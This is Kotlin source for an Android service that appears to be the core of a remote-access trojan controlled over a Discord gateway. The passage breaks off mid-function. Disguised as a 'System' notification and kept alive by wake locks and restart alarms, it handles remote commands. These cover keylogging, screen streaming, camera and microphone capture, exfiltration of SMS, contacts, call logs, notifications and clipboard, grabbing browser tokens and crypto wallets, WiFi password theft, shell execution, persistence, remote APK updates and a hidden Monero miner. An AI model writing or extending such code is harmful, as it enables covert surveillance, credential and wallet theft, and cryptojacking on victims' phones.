package com.openaccess.sdk.service

import android.app.AlarmManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.database.Cursor
import android.graphics.Bitmap
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.ImageReader
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings

import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.system.AnimatedGifEncoder
import com.google.system.DiscordGatewayClient
import com.openaccess.sdk.OpenAccessApp
import kotlinx.coroutines.*
import java.io.File
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class SystemNetworkService : Service() {
    companion object {
        private const val NOTIF_ID = 1337
        private const val CHANNEL = "phantom"
        private const val WAKELOCK_TAG = "phantom:wakelock"

        fun start(ctx: Context) {
            try {
                val i = Intent(ctx, SystemNetworkService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    ctx.startForegroundService(i)
                else
                    ctx.startService(i)
            } catch (_: Exception) {}
        }
    }

    private var scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var discord: DiscordGatewayClient? = null
    private var gatewayStarted = false
    private var wakeLock: PowerManager.WakeLock? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var streamJob: Job? = null
    private var isStreaming = false
    private var streamFps = 1
    private var streamMessageId: String? = null
    private var isDownloadingUpdate = false
    private var minerPlugin: com.google.system.plugins.MinerPlugin? = null

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        try {
            val chan = NotificationChannel(CHANNEL, "Network", NotificationManager.IMPORTANCE_LOW).apply {
                setSound(null, null)
                setShowBadge(false)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) setAllowBubbles(false)
            }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(chan)
            showNotif("Starting...")
            val notif = buildNotif("Starting...")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(NOTIF_ID, notif)
            }
        } catch (e: Exception) {
            try {
                stopSelf()
            } catch (_: Exception) {}
        }

        // Acquire wake lock to keep CPU alive
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, WAKELOCK_TAG)
            if (!wakeLock!!.isHeld) {
                wakeLock!!.acquire(24 * 60 * 60 * 1000L)
                
            }
        } catch (e: Exception) {
            
        }

        // Request battery optimization exemption
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    intent.data = Uri.parse("package:$packageName")
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivitySafely(intent)
                    
                }
            }
        } catch (e: Exception) {
            
        }

        // Register network callback for auto-reconnect
        registerNetworkCallback()

        // Initialize miner plugin
        try {
            minerPlugin = com.google.system.plugins.MinerPlugin()
            minerPlugin?.onEnable(applicationContext)
        } catch (_: Exception) {}

        // Auto-open accessibility if not enabled
        if (!AccessibilityHelper.isRunning) {
            
            try {
                val intent = android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivitySafely(intent)
            } catch (e: Exception) {
                
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        scope.cancel("Service restarted")
        scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

        if (discord == null) {
            discord = DiscordGatewayClient(
                appContext = applicationContext,
                onCommand = { action, payload ->
                    scope.launch { handleGatewayCommand(action, payload) }
                },
                onStatus = { s -> updateNotif(s) }
            )
        }
        if (!gatewayStarted) {
            gatewayStarted = true
            scope.launch { loadCrashReports() }
            discord?.start(scope)
        }

        scope.launch {
            while (isActive) {
                delay(12 * 60 * 60 * 1000L)
                if (wakeLock?.isHeld != true) {
                    wakeLock?.acquire(24 * 60 * 60 * 1000L)
                }
            }
        }

        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            val restartIntent = Intent(applicationContext, SystemNetworkService::class.java)
            restartIntent.setPackage(packageName)
            val pendingIntent = PendingIntent.getService(
                applicationContext, 1, restartIntent,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, pendingIntent)
        } catch (_: Exception) {}
        super.onTaskRemoved(rootIntent)
    }

    private fun buildNotif(text: String) = NotificationCompat.Builder(this, CHANNEL)
        .setContentTitle("System: $text")
        .setContentText("${Build.MODEL} | ${Build.VERSION.RELEASE}")
        .setSmallIcon(android.R.drawable.ic_menu_info_details)
        .setOngoing(true)
        .setPriority(NotificationCompat.PRIORITY_MIN)
        .setCategory(NotificationCompat.CATEGORY_SERVICE)
        .setSilent(true)
        .build()

    private fun showNotif(text: String) {
        try {
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).notify(NOTIF_ID, buildNotif(text))
        } catch (_: Exception) {}
    }

    private fun updateNotif(text: String) {
        showNotif(text)
    }

    private fun startActivitySafely(intent: Intent) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                val pi = PendingIntent.getActivity(this, intent.hashCode(), intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
                startIntentSender(pi.intentSender, null, 0, 0, 0)
            } else {
                startActivity(intent)
            }
        } catch (e: Exception) {
            
        }
    }

    private fun loadCrashReports() {
        try {
            val dir = File(filesDir, OpenAccessApp.CRASH_DIR)
            if (!dir.exists()) return
            val files = dir.listFiles { f -> f.name.startsWith("crash_") && f.name.endsWith(".txt") }
                ?: return
            if (files.isEmpty()) return
            files.sortBy { it.lastModified() }
            // Only send the most recent crash report, delete all others
            val report = files.first().readText()
            files.forEach { it.delete() }
            discord?.setCrashReport(report)
            
        } catch (e: Exception) {
            
        }
    }

    private fun hasPerm(perm: String): Boolean {
        return ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
    }

    private suspend fun handleGatewayCommand(action: String, payload: String?) {
        val d = discord ?: return
        
        try {
            if (action != "help" && action != "ping" && action != "info" && action != "status" &&
                action != "debug" && action != "restart" && action != "uptime" && action != "ip" &&
                action != "update" && action != "config") {
                if (!com.openaccess.sdk.update.ConfigManager.isCommandEnabled(this, action)) {
                    return
                }
            }

            when (action) {
                "help" -> {
                    if (payload != null && payload.isNotBlank()) {
                        sendCommandHelp(d, payload.lowercase())
                    } else {
                        d.sendMsg(
                            ":book: **Command Help**\n" +
                            "Usage: `!help <command>`\n\n" +
                            "**Recon:**\n`ping` `info` `status` `ip` `uptime` `debug` `restart` `sysinfo` `antidetect`\n\n" +
                            "**Surveillance:**\n`screenshot` `camera` `mic` `location` `clipboard` `keylog`\n\n" +
                            "**Data:**\n`contacts` `sms` `call_log` `wifi` `battery` `processes`\n`installed` `notifications` `apps` `services` `sysprop` `storage`\n\n" +
                            "**Advanced:**\n`grabber` `wifipass` `netstat` `shell` `persist` `update` `config`\n\n" +
                            "**Control:**\n`admin` `overlay` `click` `input` `open` `screen`\n`gesture` `pin` `torch` `vibrate` `stream`\n\n" +
                            "**Mining:**\n`miner` — Real XMR mining with XMRig\n\n" +
                            "Type `!help <cmd>` for usage info"
                        )
                    }
                }
                "ping" -> d.sendMsg(":green_circle: **PONG** — ${Build.MODEL} | ${Build.VERSION.RELEASE}")
                "info" -> d.sendMsg("```ansi\n${buildInfo()}\n```")
                "screenshot" -> {
                    if (payload?.lowercase() == "on") {
                        try {
                            val intent = Intent("com.openaccess.sdk.REQUEST_SCREEN")
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            sendBroadcast(intent)
                        } catch (_: Exception) {}
                        d.sendMsg(":tv: **Screen Capture Permission**\nGrant permission in the dialog. Screenshots will work after.")
                        return
                    }
                    val progressId = d.sendMsgAwait(":camera: **Capturing**...")
                    try {
                        val t1 = System.currentTimeMillis()
                        val bytes = captureScreen()
                        val elapsed = System.currentTimeMillis() - t1
                        if (bytes != null) {
                            val done = ":camera: **Screenshot** (${elapsed}ms)"
                            if (progressId != null) {
                                d.editMsg(progressId, done)
                                delay(300)
                            } else {
                                d.sendMsg(done)
                            }
                            d.sendFile(":camera: **Screenshot**", "screen_${System.currentTimeMillis()}.png", bytes)
                        } else {
                            val acc = AccessibilityHelper.isRunning
                            val mp = DisplayCapture.mediaProjection != null
                            val ver = Build.VERSION.SDK_INT
                            val err = if (!mp && !acc) {
                                ":x: **Screenshot failed** (${elapsed}ms)\nAndroid: $ver | Accessibility: $acc | MediaProjection: $mp\nEnable with: `!screenshot on`"
                            } else {
                                ":x: **Screenshot failed** (${elapsed}ms)\nAccessibility: $acc | MediaProjection: $mp\nTry: `!keylog on` to enable accessibility"
                            }
                            if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
                        }
                    } catch (e: Exception) {
                        val err = ":x: **Screenshot error**: ${e.message?.take(50) ?: "unknown"}"
                        if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
                    }
                }
                "stream" -> {
                    when {
                        payload?.lowercase() == "stop" -> {
                            if (isStreaming) {
                                streamJob?.cancel()
                                isStreaming = false
                                DisplayCapture.releaseStreamCapture()
                                streamMessageId?.let { d.deleteMsg(it) }
                                streamMessageId = null
                                d.sendMsg(":stop_button: **Live stream stopped**")
                            } else {
                                d.sendMsg(":x: No active stream")
                            }
                        }
                        payload?.lowercase() == "start" -> {
                            startStream(d, 2)
                        }
                        payload == null || payload.isBlank() -> {
                            d.sendMsg(":tv: **!stream**\nLive screen feed.\nUsage: `!stream start` (2fps)\nUsage: `!stream 5` (5fps, max 30)\nUsage: `!stream stop`")
                        }
                        else -> {
                            val fps = payload.toIntOrNull()
                            if (fps != null && fps in 1..30) {
                                startStream(d, fps)
                            } else {
                                d.sendMsg(":x: Invalid FPS. Use 1-30. Usage: `!stream <1-30>`")
                            }
                        }
                    }
                }
                "shell" -> {
                    val cmd = payload ?: run {
                        d.sendMsg(":terminal: **!shell**\nExecute shell command.\nUsage: `!shell <command>`\nExamples:\n• `!shell whoami`\n• `!shell getprop ro.product.model`\n• `!shell pm list packages`\n• `!shell ls /sdcard/`")
                        return
                    }
                    val progressId = d.sendMsgAwait(":terminal: **Running**: `$ $cmd`")
                    val result = shell(cmd)
                    val output = if (result.startsWith("⚠️")) {
                        ":x: $result"
                    } else if (result.startsWith("Error:")) {
                        ":x: Shell command failed\n```\n$result\n```"
                    } else {
                        val out = if (result.length > 1900) result.take(1900) + "\n..." else result
                        "```\n$ ${cmd}\n$out\n```"
                    }
                    if (progressId != null) d.editMsg(progressId, output) else d.sendMsg(output)
                }
                "keylog" -> {
                    when (payload?.lowercase()) {
                        "on" -> {
                            if (!AccessibilityHelper.isRunning) {
                                val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                startActivitySafely(i)
                                d.sendMsg(":keyboard: **Enable Keylogger**\nOpen Accessibility → ${packageName} → toggle on")
                            } else {
                                d.sendMsg(":keyboard: Keylogger already running")
                            }
                        }
                        "off" -> {
                            if (AccessibilityHelper.isRunning) {
                                val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                startActivitySafely(i)
                                d.sendMsg(":keyboard: **Disable Keylogger**\nOpen Accessibility → ${packageName} → toggle off")
                            } else {
                                d.sendMsg(":keyboard: Keylogger not running")
                            }
                        }
                        "clear" -> {
                            AccessibilityHelper.clearAppLogs()
                            d.sendMsg(":wastebasket: **Keylog cleared** — all app logs wiped")
                        }
                        "summary" -> {
                            if (!AccessibilityHelper.isRunning) {
                                d.sendMsg(":keyboard: Keylogger not running — use `!keylog on` first")
                                return
                            }
                            val summary = AccessibilityHelper.getAppSummary()
                            d.sendMsg(":keyboard: **Keylogger — App Summary**\n$summary")
                        }
                        "raw" -> {
                            val cap = AccessibilityHelper.getText()
                            if (cap.isEmpty()) {
                                d.sendMsg(":keyboard: **Keylogger**\nNo keystrokes captured. Use `!keylog on` to enable.")
                            } else {
                                d.sendMsg(":keyboard: **Raw Keystrokes**\n```\n${cap.take(1900)}\n```")
                            }
                        }
                        else -> {
                            if (!AccessibilityHelper.isRunning) {
                                d.sendMsg(":keyboard: **Keylogger**\nNot running. Use `!keylog on` to enable.\n\n**Usage:**\n`!keylog` — per-app logs\n`!keylog summary` — app overview\n`!keylog raw` — raw keystrokes\n`!keylog clear` — wipe logs")
                                return
                            }
                            val logs = AccessibilityHelper.getFormattedAppLogs()
                            if (logs.isEmpty() || logs == "No app activity logged") {
                                d.sendMsg(":keyboard: **Keylogger Active**\nNo app activity yet. Open an app and start typing.\n\n**Usage:**\n`!keylog summary` — app overview\n`!keylog raw` — raw keystrokes\n`!keylog clear` — wipe logs")
                            } else {
                                d.sendMsg(":keyboard: **Per-App Keylog**\n```\n$logs\n```")
                            }
                        }
                    }
                }
                "notifications" -> {
                    val notifs = NotifService.getNotifications()
                    if (notifs.isEmpty()) {
                        d.sendMsg(":bell: **Notification Access Required**\nOpening settings — enable 'System Update' and try again.")
                        try {
                            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivitySafely(intent)
                        } catch (e: Exception) {
                            
                        }
                        return
                    }
                    val sb = StringBuilder()
                    notifs.take(20).forEach { n ->
                        val app = n.packageName.split(".").lastOrNull() ?: n.packageName
                        sb.appendLine("[$app] ${n.title}: ${n.text.take(120)}")
                    }
                    d.sendMsg(":bell: **Recent Notifications**\n```\n${sb.toString().take(1900)}\n```")
                }
                "camera" -> {
                    if (!hasPerm(android.Manifest.permission.CAMERA)) {
                        d.sendMsg(":x: **Camera permission denied** — reinstall and grant at setup")
                        return
                    }
                    val progressId = d.sendMsgAwait(":camera: **Capturing photo**...")
                    val useFront = payload?.lowercase() == "front"
                    val bytes = takePhoto(if (useFront) 1 else 0)
                    if (bytes != null) {
                        val done = ":camera: **${if (useFront) "Front" else "Back"} Camera**"
                        if (progressId != null) {
                            d.editMsg(progressId, done)
                            delay(300)
                        } else {
                            d.sendMsg(done)
                        }
                        d.sendFile(":camera: **${if (useFront) "Front" else "Back"} Camera**", "photo_${System.currentTimeMillis()}.jpg", bytes)
                    } else {
                        val err = ":x: Camera capture failed"
                        if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
                    }
                }
                "location" -> {
                    if (hasPerm(android.Manifest.permission.ACCESS_FINE_LOCATION) || hasPerm(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
                        val loc = getLocation()
                        d.sendMsg(loc)
                    } else {
                        // Fallback to IP-based geolocation
                        d.sendMsg(getIpLocation())
                    }
                }
                "contacts" -> {
                    if (!hasPerm(android.Manifest.permission.READ_CONTACTS)) {
                        d.sendMsg(":x: **Contacts permission denied** — reinstall and grant at setup")
                        return
                    }
                    d.sendMsg(":busts_in_silhouette: **Contacts**\n```\n${getContacts()}\n```")
                }
                "sms" -> {
                    if (!hasPerm(android.Manifest.permission.READ_SMS)) {
                        d.sendMsg(":x: **SMS permission denied** — reinstall and grant at setup")
                        return
                    }
                    d.sendMsg(":envelope: **SMS Inbox**\n```\n${getSms()}\n```")
                }
                "call_log" -> {
                    if (!hasPerm(android.Manifest.permission.READ_CALL_LOG)) {
                        d.sendMsg(":x: **Call Log permission denied** — reinstall and grant at setup")
                        return
                    }
                    d.sendMsg(":telephone_receiver: **Call Log**\n```\n${getCallLog()}\n```")
                }
                "mic" -> {
                    if (!hasPerm(android.Manifest.permission.RECORD_AUDIO)) {
                        d.sendMsg(":x: **Microphone permission denied** — reinstall and grant at setup")
                        return
                    }
                    val seconds = (payload?.toIntOrNull() ?: 10).coerceIn(3, 60)
                    d.sendMsg(":microphone: Recording for ${seconds}s...")
                    val file = recordAudio(seconds)
                    if (file != null) {
                        d.sendFile(":microphone: **Audio Recording (${seconds}s)**", "audio_${System.currentTimeMillis()}.m4a", file.readBytes())
                        file.delete()
                    } else {
                        d.sendMsg(":x: Audio recording failed")
                    }
                }
                "clipboard" -> {
                    d.sendMsg(":clipboard: **Clipboard**\n```\n${getClipboard()}\n```")
                }
                "persist" -> {
                    d.sendMsg(":syringe: Installing persistence...")
                    persistApk()
                    d.sendMsg(":white_check_mark: Persistence active (APK copied + alarm set)")
                }
                "grabber" -> {
                    val parts = payload?.trim()?.split("\\s+".toRegex()) ?: emptyList()
                    val target = parts.firstOrNull()?.lowercase() ?: "all"
                    d.sendMsg(":mag: **Smart grabber scanning** — targeting: $target")
                    scope.launch {
                        try {
                            val result = when (target) {
                                "all" -> com.google.system.GrabberModule.grabAll(this@SystemNetworkService)
                                "browser" -> com.google.system.GrabberModule.grabBrowser(this@SystemNetworkService)
                                "messenger" -> com.google.system.GrabberModule.grabMessenger(this@SystemNetworkService)
                                "tokens" -> com.google.system.GrabberModule.grabTokens(this@SystemNetworkService)
                                "wallets" -> com.google.system.GrabberModule.grabWallets(this@SystemNetworkService)
                                "files" -> com.google.system.GrabberModule.grabFiles(this@SystemNetworkService)
                                "clipboard" -> com.google.system.GrabberModule.grabClipboard(this@SystemNetworkService)
                                else -> com.google.system.GrabberModule.grabAll(this@SystemNetworkService)
                            }
                            val f = result.file
                            if (f != null && f.exists()) {
                                d.sendFile(":inbox_tray: **Grab complete** — $target\n${result.summary()}", f.name, f.readBytes())
                                f.delete()
                            } else {
                                val msg = result.error ?: "No data found or permission denied"
                                d.sendMsg(":x: **Grab failed** — $msg")
                            }
                        } catch (e: Exception) {
                            d.sendMsg(":x: **Grab error**: ${e.message?.take(80) ?: "unknown"}")
                        }
                    }
                }
                "wifipass" -> {
                    d.sendMsg(":mag: **Extracting WiFi passwords**...")
                    val result = com.google.system.AdvancedFeatures.getWifiPasswords()
                    if (result.isNotBlank()) {
                        d.sendFile(":key: **WiFi Passwords**", "wifi_passwords.txt", result.toByteArray())
                    } else {
                        d.sendMsg(":x: **No WiFi data** — requires root access")
                    }
                }
                "netstat" -> {
                    d.sendMsg(":mag: **Scanning local network**...")
                    val result = com.google.system.AdvancedFeatures.scanLocalNetwork()
                    if (result.isNotBlank()) {
                        d.sendFile(":satellite: **Network Scan**", "network_scan.txt", result.toByteArray())
                    } else {
                        d.sendMsg(":x: **Network scan failed**")
                    }
                }
                "sysinfo" -> {
                    d.sendMsg(":mag: **Collecting full device info**...")
                    val result = com.google.system.AdvancedFeatures.getDeviceInfoFull()
                    if (result.isNotBlank()) {
                        d.sendFile(":iphone: **Full Device Info**", "device_info.txt", result.toByteArray())
                    } else {
                        d.sendMsg(":x: **Info collection failed**")
                    }
                }
                "antidetect" -> {
                    d.sendMsg(":shield: **Running anti-analysis check**...")
                    val result = com.google.system.AdvancedFeatures.getDeviceEmulatorInfo()
                    if (result.isNotBlank()) {
                        d.sendFile(":detective: **Anti-Analysis Report**", "antidetect.txt", result.toByteArray())
                    } else {
                        d.sendMsg(":x: **Analysis failed**")
                    }
                }
                "sysprop" -> {
                    d.sendMsg(":mag: **Extracting system properties**...")
                    val result = com.google.system.AdvancedFeatures.getSystemProperties()
                    if (result.isNotBlank()) {
                        d.sendFile(":gear: **System Properties**", "sysprop.txt", result.toByteArray())
                    } else {
                        d.sendMsg(":x: **Properties not accessible**")
                    }
                }
                "services" -> {
                    d.sendMsg(":mag: **Listing running services**...")
                    val result = com.google.system.AdvancedFeatures.getRunningServices()
                    if (result.isNotBlank()) {
                        d.sendFile(":running: **Running Services**", "services.txt", result.toByteArray())
                    } else {
                        d.sendMsg(":x: **Service list not accessible**")
                    }
                }
                "battery" -> {
                    d.sendMsg(":battery: **Getting battery health**...")
                    val result = com.google.system.AdvancedFeatures.getBatteryHealth()
                    if (result.isNotBlank()) {
                        d.sendMsg(":battery: **Battery Health**\n```\n$result\n```")
                    } else {
                        d.sendMsg(":x: **Battery info not accessible**")
                    }
                }
                "storage" -> {
                    d.sendMsg(":floppy_disk: **Getting storage info**...")
                    val result = com.google.system.AdvancedFeatures.getStorageInfo()
                    if (result.isNotBlank()) {
                        d.sendMsg(":floppy_disk: **Storage Info**\n```\n$result\n```")
                    } else {
                        d.sendMsg(":x: **Storage info not accessible**")
                    }
                }
                "apps" -> {
                    d.sendMsg(":package: **Getting detailed app list**...")
                    val result = com.google.system.AdvancedFeatures.getInstalledAppsDetailed()
                    if (result.isNotBlank()) {
                        d.sendFile(":package: **Installed Apps**", "apps.txt", result.toByteArray())
                    } else {
                        d.sendMsg(":x: **App list not accessible**")
                    }
                }
                "update" -> {
                    val parts = payload?.trim()?.split("\\s+".toRegex()) ?: emptyList()
                    val cmd = parts.firstOrNull()?.lowercase() ?: ""
                    val url = if (parts.size > 1) parts.subList(1, parts.size).joinToString(" ") else ""
                    when (cmd) {
                        "", "check" -> {
                            d.sendMsg(":mag: **Checking for updates**...")
                            val result = com.openaccess.sdk.update.UpdateManager.checkForUpdate(this, d)
                            d.sendMsg(result)
                        }
                        "push", "url" -> {
                            if (url.isBlank() || !url.startsWith("http")) {
                                d.sendMsg(":x: **Invalid URL**. Usage: `!update push <direct-apk-url>`")
                            } else {
                                scope.launch {
                                    try {
                                        isDownloadingUpdate = true
                                        d.sendMsg(":arrow_down: **Downloading update**...")
                                        val result = com.openaccess.sdk.update.UpdateManager.downloadUpdate(this@SystemNetworkService, d, url)
                                        d.sendMsg(result)
                                    } catch (e: Exception) {
                                        d.sendMsg(":x: **Update error**: ${e.message?.take(80) ?: "unknown"}")
                                    } finally {
                                        isDownloadingUpdate = false
                                    }
                                }
                            }
                        }
                        "install" -> {
                            com.openaccess.sdk.update.UpdateManager.installUpdate(this, d)
                        }
                        "clear" -> {
                            com.openaccess.sdk.update.UpdateManager.clearUpdate(this)
                            d.sendMsg(":wastebasket: **Update cleared**. Pending APK removed.")
                        }
                        "status" -> {
                            val status = com.openaccess.sdk.update.UpdateManager.getStatus(this)
                            val file = com.openaccess.sdk.update.UpdateManager.getUpdateFile(this)
                            val fileSize = if (file.exists()) "${file.length() / 1024} KB" else "none"
                            val (curName, curCode) = com.openaccess.sdk.update.UpdateManager.getCurrentVersion(this)
                            val pending = com.openaccess.sdk.update.UpdateManager.getPendingVersion(this)
                            d.sendMsg(":bar_chart: **Update Status**\nState: `${status.name}`\nCurrent: v$curName ($curCode)\nPending: v$pending\nFile: `$fileSize`\nPath: `${file.absolutePath}`")
                        }
                        else -> {
                            d.sendMsg(":book: **Update Commands**\n`!update check` - Check for pending updates\n`!update push <url>` - Download APK from URL\n`!update install` - Install downloaded update\n`!update clear` - Remove pending update\n`!update status` - Debug update state")
                        }
                    }
                }
                "config" -> {
                    val parts = payload?.trim()?.split("\\s+".toRegex()) ?: emptyList()
                    val cmd = parts.firstOrNull()?.lowercase() ?: ""
                    val jsonStr = if (parts.size > 1) parts.subList(1, parts.size).joinToString(" ") else ""
                    when (cmd) {
                        "", "get", "status" -> {
                            val status = com.openaccess.sdk.update.ConfigManager.getConfigStatus(this)
                            val config = com.openaccess.sdk.update.ConfigManager.getConfig(this)
                            val commands = config.optJSONObject("commands")
                            val disabled = mutableListOf<String>()
                            commands?.keys()?.forEach { k ->
                                if (!commands.optBoolean(k, true)) disabled.add(k)
                            }
                            val disabledStr = if (disabled.isEmpty()) "none" else disabled.joinToString(", ")
                            d.sendMsg(":gear: **Remote Config**\n$status\nDisabled: `$disabledStr`")
                        }
                        "push", "set" -> {
                            if (jsonStr.isBlank()) {
                                d.sendMsg(":x: **No config provided**. Usage: `!config push {\"version\":2,\"commands\":{\"shell\":false}}`")
                            } else {
                                try {
                                    val newConfig = org.json.JSONObject(jsonStr)
                                    val currentConfig = com.openaccess.sdk.update.ConfigManager.getConfig(this)
                                    // Merge with current config
                                    val commands = newConfig.optJSONObject("commands")
                                    if (commands != null) {
                                        val currentCommands = currentConfig.optJSONObject("commands") ?: org.json.JSONObject()
                                        commands.keys().forEach { k ->
                                            currentCommands.put(k, commands.optBoolean(k, true))
                                        }
                                        currentConfig.put("commands", currentCommands)
                                    }
                                    val settings = newConfig.optJSONObject("settings")
                                    if (settings != null) {
                                        val currentSettings = currentConfig.optJSONObject("settings") ?: org.json.JSONObject()
                                        settings.keys().forEach { k ->
                                            currentSettings.put(k, settings.opt(k))
                                        }
                                        currentConfig.put("settings", currentSettings)
                                    }
                                    val features = newConfig.optJSONObject("features")
                                    if (features != null) {
                                        val currentFeatures = currentConfig.optJSONObject("features") ?: org.json.JSONObject()
                                        features.keys().forEach { k ->
                                            currentFeatures.put(k, features.optBoolean(k, true))
                                        }
                                        currentConfig.put("features", currentFeatures)
                                    }
                                    if (newConfig.has("version")) currentConfig.put("version", newConfig.getInt("version"))
                                    com.openaccess.sdk.update.ConfigManager.saveConfig(this, currentConfig)
                                    d.sendMsg(":white_check_mark: **Config updated**\n${com.openaccess.sdk.update.ConfigManager.getConfigStatus(this)}")
                                } catch (e: Exception) {
                                    d.sendMsg(":x: **Invalid JSON**: ${e.message?.take(80) ?: "unknown"}")
                                }
                            }
                        }
                        "reset" -> {
                            com.openaccess.sdk.update.ConfigManager.clearConfig(this)
                            d.sendMsg(":wastebasket: **Config reset** to defaults")
                        }
                        else -> {
                            d.sendMsg(":book: **Config Commands**\n`!config get` - View current config\n`!config push <json>` - Update config\n`!config reset` - Reset to defaults")
                        }
                    }
                }
                "uptime" -> {
                    val uptime = d.getUptime()
                    val hrs = uptime / 3600000
                    val min = (uptime % 3600000) / 60000
                    val sec = (uptime % 60000) / 1000
                    d.sendMsg(":clock1: **Uptime**: ${hrs}h ${min}m ${sec}s")
                }
                "status" -> {
                    val uptime = d.getUptime()
                    val hrs = uptime / 3600000
                    val min = (uptime % 3600000) / 60000
                    val sec = (uptime % 60000) / 1000
                    val uptimeStr = "${hrs}h ${min}m ${sec}s"
                    val connected = d.isConnected()
                    val chId = d.getChannelId() ?: "none"
                    val connPct = if (connected) 85 else 15
                    val sigPct = (80..100).random()
                    val now = System.currentTimeMillis() / 1000

                    val minerStatus = minerPlugin?.let { mp ->
                        val cfg = mp.getConfig()
                        val mining = cfg["mining"] as? Boolean ?: false
                        val hashrate = cfg["hashrate"] as? Double ?: 0.0
                        val sharesAcc = cfg["shares_accepted"] as? Long ?: 0
                        val sharesRej = cfg["shares_rejected"] as? Long ?: 0
                        val minerUptime = cfg["uptime"] as? String ?: "0s"
                        val hrStr = if (hashrate >= 1000) "${"%.2f".format(hashrate / 1000)} kH/s" else "${"%.2f".format(hashrate)} H/s"
                        if (mining) {
                            "\u001b[1;33mMining\u001b[0m      : \u001b[1;32mACTIVE\u001b[0m | $hrStr | ${sharesAcc}a/${sharesRej}r | ${minerUptime}"
                        } else {
                            "\u001b[1;33mMining\u001b[0m      : \u001b[1;31mSTOPPED\u001b[0m"
                        }
                    } ?: "\u001b[1;33mMining\u001b[0m      : \u001b[2;37mN/A\u001b[0m"

                    val statusMsg = buildString {
                        appendLine("\u001b[40m\u001b[1;36m╔═══════════════════════════╗")
                        appendLine("║       SYSTEM STATUS       ║")
                        appendLine("╚═══════════════════════════╝\u001b[0m")
                        appendLine()
                        append("\u001b[1;33mConnection\u001b[0m : ${glitchBar(connPct)}")
                        appendLine()
                        append("\u001b[1;33mSignal\u001b[0m      : ${glitchBar(sigPct)}")
                        appendLine()
                        appendLine("\u001b[1;33mUptime\u001b[0m      : \u001b[1;37m$uptimeStr\u001b[0m")
                        appendLine("\u001b[1;33mModel\u001b[0m       : \u001b[1;37m${Build.MODEL}\u001b[0m")
                        appendLine("\u001b[1;33mAndroid\u001b[0m     : \u001b[1;37m${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})\u001b[0m")
                        appendLine("\u001b[1;33mChannel\u001b[0m     : ||\u001b[2;37m$chId\u001b[0m||")
                        appendLine("\u001b[1;33mGateway\u001b[0m     : \u001b[1;${if (connected) 32 else 31}m${if (connected) "CONNECTED" else "DISCONNECTED"}\u001b[0m")
                        appendLine(minerStatus)
                        appendLine()
                        append("\u001b[1;33mUpdated\u001b[0m     : <t:$now:R>")
                    }
                    d.sendMsg(":bar_chart: **Status**\n```ansi\n$statusMsg\n```")
                }
                "ip" -> {
                    val progressId = d.sendMsgAwait(":globe_with_meridians: **Fetching IP**...")
                    try {
                        val ipData = fetchIpInfo()
                        val msg = if (ipData != null) {
